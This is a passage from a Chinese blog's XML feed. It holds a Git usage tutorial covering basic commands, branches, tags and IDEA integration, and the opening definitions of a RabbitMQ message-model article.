<p><strong>验证码样式：</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815162027.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Git使用详解</title>
    <url>/posts/964f8f69.html</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h2 id="1-Git简介"><a href="#1-Git简介" class="headerlink" title="1. Git简介"></a>1. Git简介</h2><p><strong>Git是一个分布式版本控制工具，主要用于管理开发中的源代码文件（Java类、xml文件、html页面等），通过Git仓库来存储和管理这些文件，Git仓库分为两种：</strong></p>
<ul>
<li>本地仓库：开发人员自己电脑上的Git仓库</li>
<li>远程仓库：远程服务器上的Git仓库</li>
</ul>
<p><strong>Git作用：</strong></p>
<ul>
<li>代码回溯</li>
<li>版本切换</li>
<li>多人协作</li>
<li>远程备份</li>
</ul>
<h2 id="2-下载与安装"><a href="#2-下载与安装" class="headerlink" title="2. 下载与安装"></a>2. 下载与安装</h2><p><strong>下载地址</strong>：<a href="https://git-scm.com/download">Git下载地址</a></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153253.png"><br><strong>下载完成后得到安装文件：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153257.png"></p>
<p><strong>安装完成后在任意目录点击鼠标右键，如果能看到如下菜单则表示安装完成：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153259.png"></p>
<hr>
<ul>
<li><strong>Git GUI Here：打开 Git 图形界面</strong></li>
<li><strong>Git Bash Here：打开 Git 命令行</strong></li>
</ul>
<h1 id="二、Git代码托管服务"><a href="#二、Git代码托管服务" class="headerlink" title="二、Git代码托管服务"></a>二、Git代码托管服务</h1><h2 id="1-常用的-Git-代码托管服务"><a href="#1-常用的-Git-代码托管服务" class="headerlink" title="1. 常用的 Git 代码托管服务"></a>1. 常用的 Git 代码托管服务</h2><p><strong>Git中存在两种类型的仓库，即<code>本地仓库</code>与<code>远程仓库</code>。常用的Git远程仓库有 GitHub、码云、GitLab等。</strong></p>
<hr>
<h2 id="2-使用码云代码托管服务"><a href="#2-使用码云代码托管服务" class="headerlink" title="2. 使用码云代码托管服务"></a>2. 使用码云代码托管服务</h2><h1 id="三、Git常用命令"><a href="#三、Git常用命令" class="headerlink" title="三、Git常用命令"></a>三、Git常用命令</h1><h2 id="1-Git全局配置"><a href="#1-Git全局配置" class="headerlink" title="1. Git全局配置"></a>1. Git全局配置</h2><p>安装好Git后首先要做的事是设置用户名称与email地址，这是十分重要的，因为每次Git提交都会使用该用户信息。</p>
<ul>
<li><strong>设置用户名</strong><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;你的用户名&quot;</span><br></pre></td></tr></table></figure></li>
<li><strong>设置用户邮箱</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git configt --global user.email &quot;你的邮箱&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>查看配置信息</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure>

<h2 id="2-获取Git仓库"><a href="#2-获取Git仓库" class="headerlink" title="2. 获取Git仓库"></a>2. 获取Git仓库</h2><p>要使用Git对我们的代码进行版本控制，首先需要获得Git仓库</p>
<blockquote>
<p><strong>获取 Git 仓库通常有两种方式：</strong></p>
<ul>
<li>在本地初始化一个 Git 仓库（不常用）</li>
<li>从远程仓库克隆（常用）</li>
</ul>
</blockquote>
<h3 id="1-本地初始化Git仓库"><a href="#1-本地初始化Git仓库" class="headerlink" title="1. 本地初始化Git仓库"></a>1. 本地初始化Git仓库</h3><blockquote>
<p><strong>执行步骤如下：</strong></p>
<p>① 在任意目录创建一个空目录作为我们的本地Git仓库<br>② 进入此目录<br>③ 执行命令 <code>git init</code></p>
<hr>
<p><strong>若在目录中看到 <code>.git</code> 文件夹（此文件为隐藏文件夹）则说明 Git 仓库创建成功</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153304.png"></p>
</blockquote>
<p>① 在任意目录创建一个空目录作为我们的本地Git仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir 目录名</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153306.png"></p>
<p>② 进入此目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd 目录名</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153309.png"></p>
<p>③ 执行命令 <code>git init</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153311.png"></p>
<hr>
<h3 id="2-从远程仓库克隆"><a href="#2-从远程仓库克隆" class="headerlink" title="2. 从远程仓库克隆"></a>2. 从远程仓库克隆</h3><p><strong>可以通过Git提供的命令从远程仓库进行克隆，将远程仓库克隆到本地</strong></p>
<ul>
<li><strong>命令形式：</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone 远程Git仓库地址</span><br></pre></td></tr></table></figure>
<p><strong>码云上的仓库，复制其 url</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153314.png"></p>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153316.png"></p>
<h2 id="3-本地仓库操作"><a href="#3-本地仓库操作" class="headerlink" title="3. 本地仓库操作"></a>3. 本地仓库操作</h2><h3 id="1）版本库、工作区、暂存区"><a href="#1）版本库、工作区、暂存区" class="headerlink" title="1）版本库、工作区、暂存区"></a>1）版本库、工作区、暂存区</h3><ul>
<li><strong>版本库</strong>：上诉看到的<code>.git</code>隐藏文件夹就是版本库，版本库中存储了很多配置信息、日志信息以及文件版本信息等；</li>
<li><strong>工作区</strong>：包含<code>.git</code>文件夹的目录就是工作区，也称为工作目录，主要用于存放开发的代码；</li>
<li><strong>暂存区</strong>：<code>.git</code>文件夹中有很多文件，其中有一个 <code>index</code> 文件就会暂存区，也可以叫做 stage。暂存区是一个<code>临时保存</code>修改文件的地方。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153320.png"></li>
</ul>
<h2 id="Git工作区的文件存在两种状态：-untracked-未跟踪（未被纳入版本控制）"><a href="#Git工作区的文件存在两种状态：-untracked-未跟踪（未被纳入版本控制）" class="headerlink" title="Git工作区的文件存在两种状态：- untracked 未跟踪（未被纳入版本控制）"></a><strong>Git工作区的文件存在两种状态：</strong><br>- untracked 未跟踪（未被纳入版本控制）</h2><ul>
<li>tracked 已跟踪（被纳入版本控制）<br>  ① Unmodified 未修改状态<br>  ② Modified 已修改状态<br>  ③ Staged 已暂存状态</li>
</ul>
<p>	</p>
<p>上述文件的状态都会随着执行Git命令而发生变化</p>
<p><strong>本地仓库常用命令如下：</strong></p>
<blockquote>
<ul>
<li><code>git status</code> ：查看文件状态</li>
<li><code>git add</code>：将文件的修改加入&#x3D;&#x3D;暂存区&#x3D;&#x3D;</li>
<li><code>git reset</code>：将暂存区的文件&#x3D;&#x3D;取消暂存&#x3D;&#x3D;或&#x3D;&#x3D;切换到指定版本&#x3D;&#x3D;</li>
<li><code>git commit</code>：将暂存区的文件修改提交到版本库</li>
<li><code>git log</code>：查看日志</li>
</ul>
</blockquote>
<h3 id="2）git-status"><a href="#2）git-status" class="headerlink" title="2）git status"></a>2）git status</h3><p><strong><code>git status</code>：用于查看文件状态</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153323.png"></p>
<hr>
<h3 id="3）git-add"><a href="#3）git-add" class="headerlink" title="3）git add"></a>3）git add</h3><p><strong><code>git add</code>：将文件的修改加入暂存区</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153331.png"><br><img src="https://img-blog.csdnimg.cn/07d1507f6b9f49e5a83597f372542c7b.png"></p>
<hr>
<h3 id="4）git-reset"><a href="#4）git-reset" class="headerlink" title="4）git reset"></a>4）git reset</h3><p><strong><code>git reset</code>：将暂存区的文件&#x3D;&#x3D;取消暂存&#x3D;&#x3D;或者&#x3D;&#x3D;切换到指定版本&#x3D;&#x3D;</strong></p>
<ul>
<li><strong>取消暂存：</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153333.png"></p>
<ul>
<li><strong>切换到指定版本：</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153337.png"><br>其中<code>--hard</code>后面一串是每个版本的唯一标识，可通过 <code>git log</code> 指令查看</p>
<hr>
<h3 id="5）git-commit"><a href="#5）git-commit" class="headerlink" title="5）git commit"></a>5）git commit</h3><p><strong><code>git commit</code>：将暂存区的文件修改提交到版本库</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153338.png"></p>
<p>其中 <code>-m</code> 用于简单描述提交的信息</p>
<h3 id="6）git-log"><a href="#6）git-log" class="headerlink" title="6）git log"></a>6）git log</h3><p><strong><code>git log</code>：查看日志</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153341.png"></p>
<hr>
<h2 id="4-远程仓库操作"><a href="#4-远程仓库操作" class="headerlink" title="4. 远程仓库操作"></a>4. 远程仓库操作</h2><p><strong>上述执行的命令操作都是针对于本地仓库，以下都是操作远程仓库的常用命令：</strong></p>
<blockquote>
<ul>
<li><code>git remote</code>：查看远程仓库</li>
<li><code>git remote add</code>：添加远程仓库</li>
<li><code>git clone</code>：从远程仓库克隆</li>
<li><code>git pull</code>：从远程仓库拉取</li>
<li><code>git push</code>：推送到远程仓库</li>
</ul>
</blockquote>
<h3 id="1）git-remote"><a href="#1）git-remote" class="headerlink" title="1）git remote"></a>1）git remote</h3><p><strong><code>git remote</code>：查看远程仓库</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153344.png"></p>
<hr>
<h3 id="2）git-remode-add"><a href="#2）git-remode-add" class="headerlink" title="2）git remode add"></a>2）git remode add</h3><p><strong><code>git remote add</code>：添加远程仓库</strong></p>
<p>添加一个新的远程仓库，同时指定一个可以引用的简写（一般约定为<code>origin</code>）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add &lt;remote-name&gt; &lt;url&gt;</span><br></pre></td></tr></table></figure>

<p><strong>我们找到一个未关联任何远程仓库的本地仓库（使用 <code>git remote</code> 与 <code>git remote -v</code>均无输出）</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153346.png"><br><strong>使用<code>git remote add</code>指令</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153348.png"></p>
<hr>
<h3 id="3）git-clone"><a href="#3）git-clone" class="headerlink" title="3）git clone"></a>3）git clone</h3><p><strong><code>git clone</code>：从远程仓库克隆</strong></p>
<p>Git克隆的是Git仓库服务器上几乎所有数据（包括日志信息。历史记录等），而不仅仅是复制工作所需要的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone &lt;url&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153350.png"></p>
<hr>
<h3 id="4）git-pull"><a href="#4）git-pull" class="headerlink" title="4）git pull"></a>4）git pull</h3><p> <strong><code>git pull</code>：从远程仓库拉取</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull &lt;remote-name&gt; &lt;branch-name&gt;</span><br></pre></td></tr></table></figure>


<blockquote>
<p><code>remote-name</code>：远程仓库别名<br><code>branch-name</code>：远程仓库要拉取的分支的分支名</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153353.png"></p>
<blockquote>
<p><strong>注意：</strong><br>如果当前本地仓库不是从远程克隆而来的仓库，而是本地创建的仓库，并且仓库中存在文件，此时从远程仓库拉取文件时会报错（fatal：refusing to merge unrelated histories）<br><strong>解决方法：</strong><br>在git pull 命令后加入参数 <code>--allow-unrelated-histories</code></p>
</blockquote>
<hr>
<h3 id="5）git-push"><a href="#5）git-push" class="headerlink" title="5）git push"></a>5）git push</h3><p> <strong><code>git push</code>：推送到远程仓库</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push &lt;remote-name&gt; &lt;branch-name&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>remote-name</code>：远程仓库别名<br><code>branch-name</code>：本地仓库要推送的分支的分支名</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153356.png"></p>
<h2 id="5-分支操作"><a href="#5-分支操作" class="headerlink" title="5. 分支操作"></a>5. 分支操作</h2><ul>
<li>分支是Git使用过程中非常重要的概念。使用分支意味着你可以把你的工作从开发主线上分离开来，以免影响开发主线。同一个仓库可以有多个分支，各个分支相互独立，互不干扰。</li>
<li>通过 <code>git init</code>命令创建本地仓库时默认会创建一个 master 分支。</li>
</ul>
<p><strong>分支常用命令如下：</strong></p>
<blockquote>
<ul>
<li><code>git branch</code>：查看分支</li>
<li><code>git branch &lt;branch-name&gt;</code>：创建分支</li>
<li><code>git checkout &lt;branch-name&gt;</code>：切换分支</li>
<li><code>git push &lt;remote-name&gt; &lt;branch-name&gt;</code>：推送至远程仓库的分支</li>
<li><code>git merge &lt;branch-name&gt;</code>：合并分支</li>
</ul>
</blockquote>
<h3 id="1）git-branch"><a href="#1）git-branch" class="headerlink" title="1）git branch"></a>1）git branch</h3><p><strong><code>git branch</code>：查看分支</strong></p>
<blockquote>
<p> <strong><code>git branch</code>：列出所有本地分支</strong></p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153359.png"></p>
<blockquote>
<p> <strong><code>git branch -r</code>：列出所有远程分支</strong></p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153400.png"></p>
<blockquote>
<p> <strong><code>git branch -a</code>：列出所有本地分支与所有远程分支</strong></p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153403.png"></p>
<hr>
<h3 id="2）git-branch-branch-name"><a href="#2）git-branch-branch-name" class="headerlink" title="2）git branch [branch-name]"></a>2）git branch [branch-name]</h3><p><strong><code>git branch [branch-name]</code>：创建分支</strong></p>
<blockquote>
<p><code>branch-name</code>：要创建的分支的分支名</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153405.png"></p>
</blockquote>
<hr>
<h3 id="3）git-checkout-branch-name"><a href="#3）git-checkout-branch-name" class="headerlink" title="3）git checkout [branch-name]"></a>3）git checkout [branch-name]</h3><p><strong><code>git checkout [branch-name]</code>：切换分支</strong></p>
<blockquote>
<p><code>branch-name</code>：要切换的分支的分支名</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153407.png"></p>
<hr>
<h3 id="4）git-push-remote-name-branch-name"><a href="#4）git-push-remote-name-branch-name" class="headerlink" title="4）git push [remote-name] [branch-name]"></a>4）git push [remote-name] [branch-name]</h3><p>4）：<code>git push [remote-name] [branch-name]</code>：推送至远程仓库的分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push [remote-name] [branch-name]</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>remote-name</code>：远程仓库别名<br><code>branch-name</code>：本地仓库要推送的分支的分支名，推送至远程仓库后，远程仓库的分支名也为branch-name</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153410.png"></p>
<hr>
<h3 id="5）git-merge-branch-name"><a href="#5）git-merge-branch-name" class="headerlink" title="5）git merge [branch-name]"></a>5）git merge [branch-name]</h3><p><strong><code>git merge [branch-name]</code>：合并分支</strong></p>
<blockquote>
<p><code>branch-name</code>：要合并的分支的分支名</p>
</blockquote>
<p><strong>此处合并，是将<code>branch-name</code>分支的内容合并到当前所在分支，但当前分支内容不合并到<code>branch-name</code>分支。</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153412.png"></p>
<hr>
<h3 id="6）git-branch-d-branch-name"><a href="#6）git-branch-d-branch-name" class="headerlink" title="6）git branch -d [branch-name]"></a>6）git branch -d [branch-name]</h3><p><strong><code>git branch -d [branch-name]</code> ：删除本地分支</strong></p>
<blockquote>
<p><code>branch-name</code>：要删除的本地分支的分支名</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153413.png"></p>
<p><strong>当一个分支被推送并合并到远程分支后，<code>-d</code>才会本地删除该分支。如果一个分支还没有被推送或者合并，那么可以使用<code>-D</code>强制删除它。</strong></p>
<hr>
<h2 id="6-标签操作"><a href="#6-标签操作" class="headerlink" title="6. 标签操作"></a>6. 标签操作</h2><ul>
<li>Git中的标签，指的是某个分支某个特定时间点的状态。通过标签，可以很方便的切换到标记时的状态。</li>
<li>比较有代表性的是人们会使用此功能来标记发布点（v1.0，v2.0等）。</li>
</ul>
<p><strong>下面是 mybatis-plus 的标签：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153416.png"></p>
<hr>
<p><strong>Git常用标签命令如下：</strong></p>
<blockquote>
<ul>
<li><code>git tag</code>：列出已有的标签</li>
<li><code>git tag [tag-name]</code>：创建标签</li>
<li><code>git push [remote-name] [tag-name]</code>：将标签推送至远程仓库</li>
<li><code>git checkout -b [branch-name] [tag-name]</code>：检出标签</li>
</ul>
</blockquote>
<h3 id="1）git-tag"><a href="#1）git-tag" class="headerlink" title="1）git tag"></a>1）git tag</h3><p><strong><code>git tag</code>：查看已有的标签</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153419.png"></p>
<hr>
<h3 id="2）git-tag-tag-name"><a href="#2）git-tag-tag-name" class="headerlink" title="2）git tag [tag-name]"></a>2）git tag [tag-name]</h3><p><strong><code>git tag [tag-name]</code>：创建新的标签</strong></p>
<blockquote>
<p><code>tag-name</code>：要创建的标签的标签名</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153421.png"></p>
<hr>
<h3 id="3）git-push-remote-name-tag-name"><a href="#3）git-push-remote-name-tag-name" class="headerlink" title="3）git push [remote-name] [tag-name]"></a>3）git push [remote-name] [tag-name]</h3><p><strong><code>git push [remote-name] [tag-name]</code>：将标签推送至远程仓库</strong></p>
<blockquote>
<p><code>remote-name</code>：远程仓库别名<br><code>tag-name</code>：要推送的标签的标签名</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153423.png"></p>
<hr>
<h3 id="4）-git-checkout-b-branch-name-tag-name"><a href="#4）-git-checkout-b-branch-name-tag-name" class="headerlink" title="4） git checkout -b [branch-name] [tag-name]"></a>4） git checkout -b [branch-name] [tag-name]</h3><p> <strong><code>git checkout -b [branch-name] [tag-name]</code>：新建一个分支来指向某个标签</strong></p>
<blockquote>
<p><code>branch-name</code>：新建分支的分支名，用于指向某标签<br><code>tag-name</code>：要指向的标签的标签名</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153425.png"></p>
<hr>
<h1 id="四、IDEA集成Git"><a href="#四、IDEA集成Git" class="headerlink" title="四、IDEA集成Git"></a>四、IDEA集成Git</h1><h2 id="1-IDEA配置Git"><a href="#1-IDEA配置Git" class="headerlink" title="1. IDEA配置Git"></a>1. IDEA配置Git</h2><p><strong>① 打开IDEA的setting</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153427.png"></p>
<p><strong>② 点击Version Control，再点击Git，最后设置自己安装Git软件的路径</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153429.png"></p>
<hr>
<h2 id="2-IDEA获取仓库"><a href="#2-IDEA获取仓库" class="headerlink" title="2. IDEA获取仓库"></a>2. IDEA获取仓库</h2><p><strong>在IDEA使用Git获取仓库有两种方式：</strong></p>
<ul>
<li>本地初始化仓库</li>
<li>从远程克隆仓库</li>
</ul>
<h3 id="1-本地初始化仓库"><a href="#1-本地初始化仓库" class="headerlink" title="1. 本地初始化仓库"></a>1. 本地初始化仓库</h3><p><strong>新建工程，点击 VCS 中的 Create Git Repository</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153432.png"></p>
<hr>
<h3 id="2-远程克隆仓库"><a href="#2-远程克隆仓库" class="headerlink" title="2. 远程克隆仓库"></a>2. 远程克隆仓库</h3><p><strong>点击 Git中的Clone，之后填写远程仓库的url</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153434.png"></p>
<p>–</p>
<h2 id="3-IDEA使用Git"><a href="#3-IDEA使用Git" class="headerlink" title="3. IDEA使用Git"></a>3. IDEA使用Git</h2><h3 id="1-本地仓库操作"><a href="#1-本地仓库操作" class="headerlink" title="1. 本地仓库操作"></a>1. 本地仓库操作</h3><blockquote>
<p><strong>本地仓库操作：</strong></p>
<ul>
<li>将文件加入暂存区</li>
<li>将暂存区的文件提交到版本库</li>
<li>查看日志</li>
</ul>
</blockquote>
<h4 id="1）将文件加入暂存区"><a href="#1）将文件加入暂存区" class="headerlink" title="1）将文件加入暂存区"></a>1）将文件加入暂存区</h4><ul>
<li><strong>当新建立文件，IDEA会跳出弹窗，询问是否需要加入暂存，可选择 ADD</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153437.png"></p>
<ul>
<li><strong>若未选择上述确认键，可右键单击新文件，点击 Git，再点击ADD</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153439.png"></p>
<hr>
<h4 id="2）将暂存区的文件提交到版本库"><a href="#2）将暂存区的文件提交到版本库" class="headerlink" title="2）将暂存区的文件提交到版本库"></a>2）将暂存区的文件提交到版本库</h4><ul>
<li><strong>右键单击，选择Git，点击 Commit File</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153441.png"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153444.png"></p>
<p><strong>或者直接点击 commit 快捷按钮</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153446.png"></p>
<hr>
<h4 id="3）查看日志"><a href="#3）查看日志" class="headerlink" title="3）查看日志"></a>3）查看日志</h4><p>点击 Show History 快捷按钮</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153448.png"></p>
<hr>
<h3 id="2-远程仓库操作"><a href="#2-远程仓库操作" class="headerlink" title="2. 远程仓库操作"></a>2. 远程仓库操作</h3><blockquote>
<p><strong>远程仓库操作：</strong></p>
<ul>
<li>查看远程仓库</li>
<li>添加远程仓库</li>
<li>推送至远程仓库</li>
<li>从远程仓库拉取</li>
</ul>
</blockquote>
<h4 id="1）查看远程仓库"><a href="#1）查看远程仓库" class="headerlink" title="1）查看远程仓库"></a>1）查看远程仓库</h4><p>点击 Git，再点击 Manage Remotes</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153453.png"></p>
<hr>
<h4 id="2）添加远程仓库"><a href="#2）添加远程仓库" class="headerlink" title="2）添加远程仓库"></a>2）添加远程仓库</h4><p>在上述查看远程仓库中点击 + </p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153455.png"></p>
<hr>
<h4 id="3）推送至远程仓库"><a href="#3）推送至远程仓库" class="headerlink" title="3）推送至远程仓库"></a>3）推送至远程仓库</h4><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153457.png"></p>
<hr>
<h4 id="4）从远程仓库拉取"><a href="#4）从远程仓库拉取" class="headerlink" title="4）从远程仓库拉取"></a>4）从远程仓库拉取</h4><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153459.png"></p>
<hr>
<h3 id="3-分支操作"><a href="#3-分支操作" class="headerlink" title="3. 分支操作"></a>3. 分支操作</h3><blockquote>
<p><strong>分支操作：</strong></p>
<ul>
<li>查看分支</li>
<li>创建分支</li>
<li>切换分支</li>
<li>将分支推送到远程仓库</li>
<li>合并分支</li>
</ul>
</blockquote>
<h4 id="1）查看分支"><a href="#1）查看分支" class="headerlink" title="1）查看分支"></a>1）查看分支</h4><p>点击Git，再点击Branches</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153501.png"></p>
<h4 id="2）创建分支"><a href="#2）创建分支" class="headerlink" title="2）创建分支"></a>2）创建分支</h4><p>在上述查看分支中中点击 + New Branch</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153503.png"></p>
<h4 id="3）切换分支"><a href="#3）切换分支" class="headerlink" title="3）切换分支"></a>3）切换分支</h4><p>点击查看分支，点击想要切换的分支，选择Checkout</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153505.png"></p>
<h4 id="4）将分支推送到远程仓库"><a href="#4）将分支推送到远程仓库" class="headerlink" title="4）将分支推送到远程仓库"></a>4）将分支推送到远程仓库</h4><p>点击查看分支，点击想要推送的分支，选择Push<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153507.png"></p>
<h4 id="5）合并分支"><a href="#5）合并分支" class="headerlink" title="5）合并分支"></a>5）合并分支</h4><p>点击查看分支，点击想要合并的分支，选择Merge</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153509.png"></p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>gitee</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>谈谈RabbitMQ的五种消息模型以及SpringAMQP的使用</title>
    <url>/posts/fe26ac5e.html</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h2 id="1-RabbitMQ中的基本概念"><a href="#1-RabbitMQ中的基本概念" class="headerlink" title="1. RabbitMQ中的基本概念"></a>1. RabbitMQ中的基本概念</h2><blockquote>
<ul>
<li><strong>message</strong></li>
</ul>
<p>消息由消息头与消息体组成。消息体不透明，而消息头由其他可选属性组成，包括：RoutingKey（路由键）、Priority（相对于其他消息的优先权）等。</p>
<ul>
<li><strong>publisher</strong></li>
</ul>
<p>消息的生产者，向队列或交换机发送消息。</p>
<ul>
<li><strong>consumer</strong></li>
</ul>
<p>消息的消费者，从消息队列中获取消息。</p>
<ul>
<li><strong>exchange</strong></li>
</ul>
<p>交换机，发布订阅模式中用来接受生产者发送的消息，并负责消息路由给队列。</p>
<ul>
<li><strong>queue</strong></li>
</ul>
<p>消息队列，用来存储消息直到发送给消费者。</p>
<ul>
<li><strong>virtualHost</strong></li>
</ul>
<p>虚拟主机，用以隔离不同租户的<strong>exchange、queue、消息</strong>的隔离。</p>
<ul>
<li><strong>connection</strong></li>
</ul>
<p>网络连接。</p>
<ul>
<li><strong>channel</strong></li>
</ul>
<p>信道，他是建立在TCP连接中的虚拟连接，AMQP的发布消息、订阅队列。接受消息均是通过信道完成。他们可以通过TCP连接完成，但是建立与销毁TCP的开销对于系统来说十分大，因此引入了信道，以复用TCP连接。</p>
<ul>
<li><strong>binding</strong></li>
</ul>
<p>绑定，用于关联交换机与消息队列。</p>
<ul>
<li><strong>broker</strong></li>
</ul>
<p>消息队列服务器实体，它是一个像数据总线一样的东西，所有的服务要接收数据和发送数据都发到这个总线上，这个总线就像协议一样，让服务间的通讯变得标准和可控。</p>
</blockquote>
